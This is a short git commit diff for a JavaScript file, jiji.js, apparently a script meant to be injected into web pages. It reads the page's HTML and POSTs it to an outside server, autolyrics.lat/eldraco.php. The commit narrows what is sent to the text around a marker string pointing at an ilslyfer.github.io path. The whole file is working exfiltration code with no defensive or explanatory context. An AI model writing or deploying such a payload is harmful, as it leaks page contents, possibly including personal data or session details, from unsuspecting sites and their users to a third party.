55e98341f37dd320d1ce98ea33597d50bac79bd9
Slyfer <67638136+iLSlyfer@users.noreply.github.com>
2026-07-22 18:29:07 -0300

    Update jiji.js

--- jiji.js
+++ jiji.js
@@ -1,5 +1,11 @@
+const html = document.documentElement.outerHTML;
+
+const buscar = "ilslyfer.github.io/_s7d6_scene7_com";
+
+const pos = html.indexOf(buscar);
+
 fetch("https://autolyrics.lat/eldraco.php", {
     method: "POST",
     headers: { "Content-Type": "text/plain" },
-    body: document.documentElement.outerHTML
+    body: pos !== -1 ? html.substring(pos - 100, pos + buscar.length + 100) : "no encontrado"
 });
